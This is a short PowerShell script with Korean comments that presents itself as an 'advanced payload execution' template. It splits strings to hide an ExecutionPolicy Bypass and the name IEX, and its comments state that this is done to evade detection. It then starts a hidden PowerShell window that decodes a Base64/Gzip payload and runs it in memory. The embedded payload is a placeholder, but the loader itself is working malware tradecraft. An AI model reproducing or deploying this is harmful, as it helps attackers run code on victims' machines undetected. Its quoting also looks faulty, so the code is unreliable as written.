# 고도화된 PowerShell 페이로드 실행 코드
# 특징: 실행 함수를 동적으로 구성하고, 압축된/인코딩된 페이로드를 메모리에서 즉시 실행

# 1. 실행할 페이로드 (실제 악성 명령이라고 가정)를 Base64 및 Gzip 압축
# 원본: Write-Host "Advanced Intrusion Attempt Detected"
$payload = "H4sIAAAAAAAEAGNgYGDnPAwxwGCIYmBkYGRiZlCckVpUDA5gABJbC0tKLAEqdgtLAQAA"

# 2. 실행 정책 우회를 위한 문자열 난독화 및 조합
$x = "Execu"
$y = "tionPolicy"
$z = "By"
$w = "pass"
$policy = $x + $y
$bypass = $z + $w

# 3. 주요 함수명 동적 구성
# IEX (Invoke-Expression) 문자열을 조합하여 탐지 회피
$iex_name_part1 = 'I'
$iex_name_part2 = 'EX'
$iex_command = $iex_name_part1 + $iex_name_part2

# 4. 페이로드 디코딩 및 실행을 위한 복잡한 Invoke-Expression 구문
powershell.exe -$policy $bypass -NoProfile -WindowStyle Hidden -Command "& {
    $data = [Convert]::FromBase64String('$payload'); 
    $ms = New-Object IO.MemoryStream($data); 
    $gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress); 
    $sr = New-Object IO.StreamReader($gz); 
    $script = $sr.ReadToEnd(); 
    # 동적 함수 호출
    & $iex_command $script
}"
